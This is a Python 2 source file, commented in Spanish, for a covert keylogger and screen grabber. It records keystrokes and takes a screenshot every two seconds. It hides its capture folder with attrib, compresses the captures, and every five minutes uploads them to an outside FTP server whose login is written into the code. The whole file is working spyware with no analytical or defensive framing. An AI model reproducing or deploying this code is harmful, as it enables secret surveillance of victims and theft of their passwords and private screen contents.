#-*- coding: utf-8 -*-
import os
import time, datetime, tarfile, sys
from ftplib import FTP
from PIL import ImageGrab
import threading
import pyHook, pythoncom

usuario = os.environ.get("USERNAME")
ftp_server = 'ftp.servegan.comxa.com'
ftp_user = 'a9817379'
ftp_clave = 'darksage12'
ftp_raiz = '/public_html'
fecha = ''
archive_k = ''


# Verifica que directorio existe y arma una ruta dentro del directorio de usuario
if os.path.exists("c:\\usuarios\\"):
	ruta = "c:\\usuarios\\%s\\appdata\\"%(usuario)
elif os.path.exists("c:\\users\\"):
	ruta = "c:\\users\\%s\\appdata\\"%(usuario)
elif os.path.exists("c:\\documents and settings\\"):
	ruta = "c:\\documents and settings\\%s\\datos de programa\\"%(usuario)
# Arma la ruta completa al directorio de captura
ruta_alternativa = ruta
ruta="%slocalcache\\"%(ruta)
 
# Verifica que el directorio de captura exista, si no existe lo crea 
if os.path.exists(ruta):
	pass
else:
	os.mkdir(ruta)
	os.system( "attrib +h +s %slocalcache"%( ruta_alternativa ) )

# Variable para el manejo de archivos en el directorio de capturas
def log_create():
	name_log = "%s%s.log"%(ruta, getDate())
	return name_log
def change(x):
	if x < 10:
		return "0%s"%(x)
	else:
		return x

def getDate():
	current_date = datetime.datetime.now()
	day = change( current_date.day )
	month = change( current_date.month )
	year = change( current_date.year )
	second = change( current_date.second )
	minute = change( current_date.minute )
	hour = change( current_date.hour )
	
	return '%s-%s-%s-%s-%s-%s'%( day, month, year, hour, minute, second )
	

def catch():
	x=0
	global fecha
	while True:
		fecha = getDate()
		try:
			ImageGrab.grab().save("%s%s.jpg"%(ruta,fecha),"JPEG")
		except Exception, e:
			files = open( log_create(), "a" )
			files.write( e )
			files.close()
		time.sleep(2)

def rar():
	while True:
		directorio = os.listdir( ruta )
		fecha = getDate()
		archive_rar = tarfile.open( "%sa%s.tar.gz"%( ruta, fecha ), "w:gz" )
		for archive in directorio:
			if archive[ len( archive ) - 3 : len( archive ) ] == 'jpg' or archive[ len( archive ) - 3 : len( archive ) ] == 'txt' :
				archive_rar.add( "%s%s"%( ruta, archive ), archive )
				os.remove( "%s%s"%( ruta, archive ) )
		archive_rar.close()				
		os.system( "attrib +s +h %sa%s.tar.gz"%( ruta, fecha ) )
		time.sleep(300)
		

def up_archive():
	while True:
		directorio = os.listdir( ruta )
		try:
			connect = FTP( ftp_server, ftp_user, ftp_clave )
			connect.cwd( ftp_raiz ) 
			for archive in directorio:
				if archive[ len( archive ) - 2 : len( archive ) ] == 'gz' or archive[ len( archive ) - 3 : len( archive ) ] == 'log':
					trama = open( "%s%s"%( ruta, archive ), 'rb' )
					
					try:
						connect.storbinary( 'STOR ' + archive, trama )
					except Exception, e:
						files = open( log_create(), "a" )
						files.write( e )
						files.close()
					trama.close()
					os.remove( "%s%s"%( ruta,archive ) )
			connect.quit()
			time.sleep( 300 )
			
		except Exception, e:
			files = open( log_create(), "a" )
			files.write( e )
			files.close()
def get_name_archive():
	global archive_k
	archive_k = "%s%s.txt"%( ruta, getDate() )

def log():
	get_name_archive()
	while True:
	 	catch_key()

def catch_key():
	action = pyHook.HookManager()
	action.KeyDown = action_save
	action.HookKeyboard()
	pythoncom.PumpMessages()

def action_save( keys ):
	save_archive( archive_k, keys.Key )

def save_archive( name_archive, text ):
	file = open( name_archive, "a")
	file.write( text )
	file.close()



h1 = threading.Thread( target = catch )
h2 = threading.Thread( target = rar )
h3 = threading.Thread( target = up_archive )
h4 = threading.Thread( target = log )
h1.start()
h2.start()
h3.start()
h4.start()